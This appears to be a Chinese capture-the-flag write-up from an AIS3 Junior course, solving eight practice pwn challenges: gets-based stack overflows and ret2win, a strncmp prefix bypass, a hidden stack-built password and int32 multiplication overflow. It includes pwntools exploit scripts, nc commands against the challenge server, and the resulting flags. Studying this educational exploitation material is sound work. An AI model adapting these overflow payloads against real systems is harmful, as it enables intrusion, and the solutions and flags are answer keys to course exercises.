---
title: "AIS3 Junior Pwn "
description: "securi"
date: 2026-08-21
tags: ["AIS3", "security"]
---

# AIS3 Junior  pwn
## 1. Pwn-1 
#### 1.觀察題目
題目說這支程式會讀我的輸入,只要把某個變數改成對的數字就會印 flag。所以我要算好 payload 再去打`165.154.226.158 11037`這邊提示有兩個:先算 offset、目標數字不是鍵盤打得出來的字。
首先我先用 checksec 看保護:
```
Arch:    amd64-64-little       
Stack:   No canary found        
PIE:     No PIE (0x400000)     
NX:      enabled
```
因為這題沒看到stack canary,所以我認爲這題是可以stack overflow的題目
接著我反組譯了`main`，我把邏輯意思寫在下面
```
4011cc  lea rax, [rbp - 0x20]                 ; buffer 在 rbp-0x20
4011d3  call gets                             ; gets 讀輸入,無邊界檢查!
4011dd  cmp dword [rbp - 0x8], 0xcafebabe     ; 檢查變數 == 0xcafebabe
4011e4  jne main+0x7f                         ; 不等就跳過
4011e6  ... puts(flag)                        ; 相等就會印 flag
```
這邊可以觀察到程式是用gets把輸入讀進 [rbp-0x20],gets
然後沒有限制長度，這代表我要打幾行都可以，而flag的條件是 [rbp-0x8] 這個變數要等於 0xcafebabe,既然我這邊觀察到gets能溢位，所以我就可以用很長的輸入把它直接蓋成 0xcafebabe。
再來我們要算offest
buffer和目標變數在stack上，把他們相減就是距離
```
buffer   在 rbp - 0x20
目標變數  在 rbp - 0x08
offset = 0x20 - 0x08 = 0x18 = 24 bytes
```
所以我可以先塞24個 byte 填到目標變數前,接著 4 個 byte 就會正好落在 [rbp-0x8]。
接下來看到第二個提示重點：`:0xcafebabe`不是可見字元,鍵盤打不出「這個數值」。如果我鍵盤打 cafebabe,送出去的是 ASCII 的 c、a、f… 而不是那個數。所以要直接送原始 bytes,而且 x86 是小端序,0xcafebabe，所以在記憶體裡要倒排成` be ba fe ca`。
接下來我要使用pwn tools
所以我用python寫了一隻腳本：
```python
from pwn import *
offset  = 24
target  = 0xcafebabe
payload = b'A' * offset + p32(target)
p = remote('165.154.226.158', 11037)
p.sendline(payload)
p.interactive()  
```
輸出：
![截圖 2026-08-07 中午12.20.21](https://hackmd.io/_uploads/BkmfaRfLzx.png)
Flag:AIS3{0v3rfl0w_caf3}
## 2.Pwn-2 
#### 1.觀察題目
題目說這支程式會讀我的輸入，要我想辦法跳到 win 就會印 flag。附本機練習版（過關印假 flag），算好 payload 後打遠端 nc 165.154.226.158 11038 拿真 flag。所以：蓋到 return address、win 的位址要自己查。
首先我先看`checksec`再反組譯。
```
No canary found       ← 沒 canary，所以溢位不會擋
No PIE (0x400000)     ← 位址固定,查到的 win 位址就能直接就能用
```
接下來我反組譯了`main`看到了重要的這幾行
```
40118b  lea rax, [rbp - 0x20]     ; buffer 在 rbp-0x20
401192  call gets                 ; ★ gets 讀輸入,沒有邊界檢查
4011a1  leave
4011a2  ret                       ; ★ 這裡會 ret 回「返回位址」
```
這邊可以發現main 用 gets 把輸入讀進 `[rbp-0x20]`,gets 沒有限制長度、所以我要打多長都可以。跟 pwn01 不一樣的是,這題不是去蓋某個變數,而是要蓋過 buffer、蓋過 saved rbp、直接蓋掉 main 的返回位址。這樣當 main 執行到 ret 時,就會「跳到我指定的位址」,而不是正常返回。
接下來我再看有沒有 win:
```
asm
0000000000401156 <win>:            ; ★ win 在 0x401156
  ... call puts(flag) ...
```
這邊我發現win 會印 flag,但是正常流程不會呼叫它。所以我的目標就是:把返回位址改成 win 的位址 0x401156。
接下來我要算offset到頂的返回位址
stack 由低位址往高位址是這樣排的:
```
buffer → saved rbp → 返回位址。
```
所以我要先填滿 buffer 和 saved rbp,接下來 8 個 byte 才會落在返回在位址上:
```
buffer      在 rbp - 0x20        → 32 bytes
saved rbp                        → 8 bytes
返回位址    在 saved rbp 之後
offset = 0x20 + 8 = 40 bytes
```
所以我發現 40 個 byte 是垃圾填充，他會到第41個 byte就是我要覆蓋的返回位址
再來根據題目題是說win位置要自己查。因為 no PIE,位址是固定的,我是用Ghidra看函式位置
![截圖 2026-08-08 下午4.14.05](https://hackmd.io/_uploads/BkoLBPEUMx.png)
得到win =  0x401156

接下來我要組一個payload
因為x86-64 是小端序,0x401156 在記憶體要排成
```
56 11 40 00 00 00 00 00
```
所以我用 pwntools 的 p64() 自動幫我轉:
```python
from pwn import *
context.binary = './pwn02_local.out'
win = 0x401156           
payload = b'A' * 40 + p64(win)
p = remote('165.154.226.158', 11038)
p.sendline(payload)
p.interactive()
```
因為我是Mac所以跑不了 Linux 執行檔,所以我在 Linux/容器裡驗;然後直接送去遠端：
```
> AIS3{r3t2t3xt_w1n}
```
Flag:AIS3{r3t2t3xt_w1n}
## 3.Pwn-HW-01 
#### 1.觀察題目
題目說這支程式會問我 Ticket:，過關就印 flag。算好後打遠端 nc 165.154.226.158 11039，根據這個提示代表題目不是溢位，是邏輯問題跟「長度」和「比對方式」有關
首先我先分析main，可以看到程式裡有個內建的參考票字串 VIP_ACCESS_TICKET（strings 也看得到），長度 17。它對我輸入的票做了三道檢查
![截圖 2026-08-08 下午6.28.52](https://hackmd.io/_uploads/By-eHtVIGx.png)
```
len = strlen(input);                                 // 先算我輸入的長度
if (len == 0)   { puts("Empty ticket."); return; }   // 第一關：空票擋掉
if (len >= 17)  { puts("Complete tickets are disabled."); return; }  // 第二關：完整票擋掉
if (strncmp(input, "VIP_ACCESS_TICKET", len) == 0)   // 第三關：比對
    puts(flag);
else
    puts("Invalid ticket.");
```
接著我對照組語確認
```
- 0x1276 先對參考票 strlen → 得到 17，存起來（[rbp-0x60]）
- 0x12cc 對我的輸入 strlen → 我的長度（[rbp-0x5c]）
- 0x12d4 我的長度 == 0 → Empty ticket.
- 0x12f0 我的長度 >= 17 → Complete tickets are disabled.
- 0x1322 strncmp(input, VIP_ACCESS_TICKET, 我的長度)
```
再來我觀察到第三關的部分，我認爲一般人會用 strcmp（整條比到底，但這題用的是 strncmp，而且第三個參數 n 是「我輸入的長度」。strncmp 只會比對前 n 個字元——也就是說，它只比對我打了幾個字。
接下來我把三關合起來看：
1. 我不能送空的（第一關會擋）
2. 我不能送完整的 17 字元（第二關會擋）
3. 但只要我送的是參考票的前綴，strncmp 只比我打的那幾個字，前綴當然會相符 → 過第三關

所以我的結論是:送一個非空、長度 < 17 的前綴。這正好呼應提示的「長度跟比對怎麼配合」——因為講師用長度擋掉了「空」跟「完整」兩個極端,卻沒有對 strncmp 對「中間的前綴」照樣會回相符

再來這邊我是寫一個payload
payload 就是參考票的第一個字元 V（長度 1，非空、遠小於 17，而且是 VIP_ACCESS_TICKET 的前綴）：`V`
```python
printf 'V\n' | nc 165.154.226.158 11039    
```
為什麼 payload 是 V
回顧前面三道檢查（用參考票 VIP_ACCESS_TICKET，長度 17）：
```python
len = strlen(你的輸入);
if (len == 0)         → "Empty ticket."                   // 空的擋
if (len >= 17)        → "Complete tickets are disabled."  // 完整的擋
if (strncmp(你的輸入, "VIP_ACCESS_TICKET", len) == 0)      // 只比 len 個字元
    → 印 flag
```
payload 要同時滿足三個條件，V 剛好全中：
| 條件 | 要求 | V 為什麼過 |
| :--- | :--- | :--- |
| 過第一關 | 長度 `≠ 0`（非空） | `V` 長度是 `1`，非空  |
| 過第二關 | 長度 `< 17`（不是完整票） | `V` 長度 `1` `< 17`  |
| 過第三關 | 是 `VIP_ACCESS_TICKET` 的前綴 | `V` 是它的第 `1` 個字  |

所以我根本不用知道完整的票，只要送它的開頭一小段就好。因為講師用「長度」把「空票」和「完整票」兩個極端擋掉了，卻忘了 strncmp 對「中間任何前綴」都會判定相符。

把payload送出之後會回
```
Ticket: Welcome, VIP!
AIS3{strl3n_pr3f1x}
```
## 4.Pwn-HW-02 
#### 1.觀察題目
題目說這支程式會問我 Password:，過關印 flag，算好後打遠端 nc 165.154.226.158 11040。提示說：看起來很長很安全的那組密碼不一定是正解。
我先照慣例先 strings 掃一遍字串，然後我就看到超顯眼的
```
SuperSecurePassword!!!
```
如果是我平常我是會直接拿這組去試，但題目有說到很長很安全的那組不一定是正解，所以我沒有去試，我是拿進去ghidra裡面分析
![截圖 2026-08-08 晚上7.31.38](https://hackmd.io/_uploads/Hy_sX5NUzl.png)
反組譯 main，一開始就看到一段很可疑的東西——它用一連串 mov byte 把一個字串一個字元一個字元塞進 stack：
```
mov byte [rbp-0x58], 0x70   ; 'p'
mov byte [rbp-0x57], 0x77   ; 'w'
mov byte [rbp-0x56], 0x6e   ; 'n'
mov byte [rbp-0x55], 0x6d   ; 'm'
mov byte [rbp-0x54], 0x33   ; '3'
mov byte [rbp-0x53], 0x21   ; '!'
mov byte [rbp-0x52], 0x00   ; '\0'
```
![截圖 2026-08-08 晚上7.35.48](https://hackmd.io/_uploads/S1liE5NUMg.png)
繼續往下看可以看到程式讀入我的輸入後，做了兩次 strcmp：
```
if (strcmp(input, "SuperSecurePassword!!!") == 0)
    puts("That account is locked.");   
else if (strcmp(input, "pwnm3!") == 0)
    { puts("OK!"); puts(flag); }        
else
    puts("Wrong!");
```
這樣我就可以知道
```
- 輸入 SuperSecurePassword!!! → 印 That account is locked.，是個陷阱（故意設成「帳號被鎖」，讓你以為方向對了其實白忙）
- 輸入 stack 拼出來的 pwnm3! → OK! + flag
- 如果輸入其他的 → Wrong!
```
目前我們知道密碼是`pwnm3！`
我就可以直接送去`65.154.226.158 11040`
```
printf 'pwnm3!\n' | nc 165.154.226.158 11040
```
輸出：
![截圖 2026-08-08 晚上7.42.15](https://hackmd.io/_uploads/BypXUcVLMx.png)
Flag:AIS3{strcmp_bu1lt_s3cr3t}
## 5.Pwn-HW-03 
#### 1.觀察題目
首先可以看到題目這是一間批次下單的店，輸入數量、滿足過關條件就印 flag，算好後打遠端 nc 165.154.226.158 11041。提示有兩句：負數會被擋；正數也不代表 n×10 就是你心裡想的那個數，我覺得有個提示很關鍵`「n×10 不一定是你想的那個數」`
我覺得這代表這題有整數溢位，乘法的結果會跟你直覺算的不一樣
接下來我打開ghidra反組譯main，把可以過關的邏輯整理出來
![截圖 2026-08-08 晚上8.02.51](https://hackmd.io/_uploads/ryueo548zl.png)
```
scanf("%d", &n);                 // n 是 signed 32-bit int
if (n <= 0)          → 拒絕       // 對應提示「負數會被擋」（0 也擋）
total = n * 10;                  // ★ 每單位 10 元，算總額（32-bit）
if (total > 1000)    → "訂單太大" 拒絕
// 走到這代表 total <= 1000
if (n > 99999)       → 印 flag（大訂單才有獎）
else                 → "Too small for the prize."
```
這邊我發現
```
要拿 flag，必須同時滿足兩個條件：
- n > 99999（訂單要夠大才有獎）
- n * 10 <= 1000（總額不能超過上限 1000）
```
如果我把這兩條擺在一起就發現：正常數學下根本不可能。n 只要大於 99999，n×10 至少是 999990，遠遠超過 1000，一定被「訂單太大」擋掉，所以我就想到題目說「n×10 不一定是你想的那個數」，因為 total 是 signed 32-bit int，它能表示的最大值是 2147483647。只要 n×10 的真實值超過這個上限，它就會溢位回繞，被電腦解讀成一個小數字甚至負數——而不是我心裡想的那個大數。
所以只要讓 n×10 溢位成 ≤ 1000（例如變成負數），我就能同時騙過兩個檢查：n 本身還是個 > 99999 的大正整數（過得了「大訂單」），但 n×10 溢位後變小（過得了「總額 ≤ 1000」）。

接下來我要寫一個payload
我要找一個 n，滿足：
- n > 0 且 n > 99999（n 本身是合法大正整數，≤ int32 上限 2147483647）
- n * 10 溢位後（當成 signed int32）≤ 1000

其實最簡單就是讓 n * 10 大到超過 2147483647，這樣它一被當成有號數就變負數，負數就會是 ≤ 1000。
```
取 n = 300000000（三億）：
- n = 300000000 < 2147483647 → 還是個合法的正 int32 ，而且 > 99999 
- n * 10 = 3,000,000,000 → 超過 int32 上限，回繞後被解讀成 3000000000 − 4294967296 = −1294967296
- total = −1294967296 <= 1000 
```
接下來我直接把數量輸入 300000000：
```
printf '300000000\n' | nc 165.154.226.158 11041
```
會回應：
![截圖 2026-08-08 晚上10.39.34](https://hackmd.io/_uploads/ryf216E8zg.png)
Flag:AIS3{1nt_0v3rfl0w_buy}
## 6.wn-HW-04 
#### 1.觀察題目
題目說這支程式有兩關輸入（stage1> / stage2>），兩關都過才印 flag。附本機練習版（假 flag），算好後打遠端 nc 165.154.226.158 11042。
提示是：一次蓋對不夠；看看 stack 上還有什麼要一起對——我覺得他這是在暗示不只一個變數要蓋，而且要分關處理。
我先 checksec（No canary、可溢位），再反組譯 main，把邏輯理出來：
![截圖 2026-08-08 晚上10.53.12](https://hackmd.io/_uploads/SyLJX64LGg.png)
```
int check1 = 0;   // [rbp-0x10]，一開始被清成 0
int check2 = 0;   // [rbp-0xc]，一開始被清成 0
char buf[?];      // [rbp-0x30]

puts("stage1>");
gets(buf);                        // 第一關讀輸入（gets，無邊界檢查）
if (check1 != 1) { 失敗; exit; }   // stage1 過關條件：check1 == 1

puts("stage2>");
gets(buf);                        // 第二關讀輸入（同一個 buf）
if (check2 == 0xdeadbeef)         // stage2 過關條件：check2 == 0xdeadbeef
    puts(flag);
```
這邊我觀察到幾個重點：
- 兩關都用 gets 讀進同一個 buffer（rbp-0x30），gets 不管長度 → 所以可以溢位。
- 過關靠的是兩個變數 check1、check2，它們就排在 buffer 上方的 stack 上，初始都是 0。
- stage1 只看 check1，stage2 只看 check2。這跟題目說的一樣一次蓋對不夠；看看 stack 上還有什麼要一起對

接下來我要來算offset
```
兩個 check 變數的位置，用它們跟 buffer 的距離算：

buffer  在 rbp - 0x30
check1  在 rbp - 0x10  → offset = 0x30 - 0x10 = 0x20 = 32
check2  在 rbp - 0x0c  → offset = 0x30 - 0x0c = 0x24 = 36
```
所以：
- 要蓋 check1，就要在前面填 32 個東西，第 33 個 byte 開始就是 check1。
- 要蓋 check2，就要在前面填 36 個東西，第 37 個 byte 開始就是 check2。

接下來我要組兩段payload
兩關的 check 都是 int（4 bytes），要用小端序寫入：
```
stage1：把 check1 蓋成 1
b'A'*32 + p32(1)

stage2：把 check2 蓋成 0xdeadbeef
b'B'*36 + p32(0xdeadbeef)

0xdeadbeef 是打不出來的數值，所以一樣要送 raw bytes、小端序（ef be ad de），p32() 幫我轉。
```
接下來我要兩關要照順序：先送 stage1 的 payload，看到 stage2> 再送 stage2 的：
```python
from pwn import *
p = remote('165.154.226.158', 11042)
p.sendlineafter(b'stage1>', b'A'*32 + p32(1))   
p.sendlineafter(b'stage2>', b'B'*36 + p32(0xdeadbeef)) 
print(p.recvall(timeout=3).decode())
```
回應：
![截圖 2026-08-08 晚上11.03.17](https://hackmd.io/_uploads/H1eHS6E8Gx.png)
Flag:AIS3{tw0_st4ge_b0f}
## 7.Pwn-HW-05 
#### 1.觀察題目
題目說要先過一道 Token 檢查，才會讓我留 note；然後想辦法跳到 win 就印 flag。算好後打遠端 nc 165.154.226.158 11043。

我先 checksec，再看函式列表——nm 看到有 check_token、main、win 三支，win。反組譯後把兩個關卡拆開來看。
![截圖 2026-08-08 晚上11.24.21](https://hackmd.io/_uploads/SJf45pN8fx.png)
```
check_token 的邏輯：
scanf("%63s", buf);              // 讀 token
if (len == 0) return 0;          // 空的擋
if (strncmp(buf, "OPEN_SESAME_PLEASE", len) == 0)   // ★ 只比對 len 個字元
    return 1;                    // 過關
return 0;
```
token 參考字串 OPEN_SESAME_PLEASE 在 rodata（0x402026）。這裡有個問題跟之前的 Ticket 題一樣：strncmp 的第三個參數是我輸入的長度，只比我打了幾個字。所以送任意非空前綴就會過（例如 O、OPEN）。不過這題沒有長度上限，就是直接送完整的 OPEN_SESAME_PLEASE。
main 裡的判斷是 if (check_token() != 0) 才繼續，所以只要 token 過關，就會進到留 note 的階段。

接下來我們來處理第二關，過了 token，main 印 Leave a note:，然後用 gets 把 note 讀進 [rbp-0x20]：
```
40134f  lea rax, [rbp - 0x20]     ; note buffer 在 rbp-0x20
401356  call gets                 ; ★ gets，無邊界檢查
...
401366  ret                       ; ★ main 的 ret 會跳到「返回位址」
```
跟前面 ret2win 題一模一樣——gets 可以溢位，蓋過 buffer、蓋過 saved rbp，直接蓋掉 main 的返回位址，讓 ret 跳進 win。
而 win 就是印 flag 的函式，用 nm 查到位址（no PIE 固定）：
```
nm hw05_local.out | grep win
```
```
#0000000000401216 T win
```
再來我要算offset
```
note buffer 在 rbp - 0x20        → 32 bytes
saved rbp                         → 8 bytes
返回位址   在 saved rbp 之後
offset = 0x20 + 8 = 40 bytes
```
所以 note 要填 40 個東西，接著 8 個 byte 放 win 的位址。

再來我要組合兩關的 payload
- 第一關（Token）送：OPEN_SESAME_PLEASE
- 第二關（note）送：b'A'*40 + p64(0x401216)
```python
from pwn import *
context.binary = './hw05_local.out'
p = remote('165.154.226.158', 11043)
p.sendlineafter(b'Token: ', b'OPEN_SESAME_PLEASE')          
p.sendlineafter(b'Leave a note:', b'A'*40 + p64(0x401216))   # ret2win
p.interactive()
```
回傳：
![截圖 2026-08-08 晚上11.35.56](https://hackmd.io/_uploads/r1DJp6EIMl.png)
Flag:AIS3{l0g1c_th3n_r3t}
## 8.Pwn-HW-06 
#### 1.觀察題目
題目說要先訂座位、過關才會進 VIP lane 讓我留 note，然後跳到 win 就印 flag，算好後打遠端 nc 165.154.226.158 11044。

我先 checksec，再看函式win、main，還有一支 vault（VIP lane 的實作）。反組譯後發現這題有兩關：訂位那關要用整數溢位過，進了 vault 之後才是 ret2win。
![截圖 2026-08-08 晚上11.58.13](https://hackmd.io/_uploads/H1M7GCEIGg.png)
我先看定位
![截圖 2026-08-09 凌晨12.03.30](https://hackmd.io/_uploads/r14umAN8Mx.png)

```
main 的邏輯：
int price = 1000000000;          // 每個座位 10 億（0x3b9aca00）
scanf("%d", &n);                 // 訂幾個座位
if (n <= 0)              → "Booking rejected."     // 要正數
total = n * price;               // ★ int32 相乘，會溢位
if (99 < total && total <= 5000) → 拒絕            // 中間區間擋掉
if (total <= 99)        → 進 vault（VIP lane）  
else                    → 拒絕
```
我把進 vault 的條件抓出來：n > 0 且 total <= 99。這裡就矛盾了——total = n × 10億，只要 n 是正的，這個乘積乘起來數字很大，怎麼會是 ≤ 99？

這個問題跟 hw03 一樣：total 是 signed 32-bit int，n * 1000000000 只要超過 int32 上限（21 億多）就會溢位回繞成小數或負數。所以我要挑一個 n，讓乘積溢位到 ≤ 99。

試算：
```
- n=2：2×1e9 = 2000000000，還沒超過 21 億上限 → 是個很大的正數 → 被擋
- n=3：3×1e9 = 3000000000，超過上限 → 回繞成 3000000000 − 4294967296 = −1294967296→ ≤ 99 
```

所以 n=3 就能過訂位這關（n=3 本身是正數，乘積溢位成負數）。
過了訂位，程式呼叫 vault，它印 VIP lane unlocked. Leave a note:，然後用 gets 把 note 讀進 [rbp-0x20]：
asm
40120b  lea rax, [rbp - 0x20]     ; note buffer 在 rbp-0x20
401212  call gets                 ; ★ gets，無邊界
40121e  ret                       ; ★ vault 的 ret 跳到「返回位址」
標準 ret2win——溢位蓋掉 vault 的返回位址，讓它 ret 時跳進 win。

接下來算 offset 和查 win：
note buffer 在 rbp - 0x20   → 32 bytes
saved rbp                    → 8 bytes
返回位址   在 saved rbp 之後
offset = 0x20 + 8 = 40
```
nm hw06_local.out | grep win
# 00000000004011d6 T win
```
再來就是把兩關的串起來
- 第一關（訂位）送：3（讓乘積溢位成負數，過 total ≤ 99）
- 第二關（note）送：b'A'*40 + p64(0x4011d6)（溢位蓋返回位址跳 win）
```python
from pwn import *
context.binary = './hw06_local.out'
p = remote('165.154.226.158', 11044)
p.sendlineafter(b'positive): ', b'3')           
p.sendlineafter(b'Leave a note:', b'A'*40 + p64(0x4011d6))   # ret2win
p.interactive()
```
回應：
![截圖 2026-08-09 凌晨12.17.17](https://hackmd.io/_uploads/rJ9580NLfl.png)
Flag:AIS3{0vf_th3n_r3t2}
















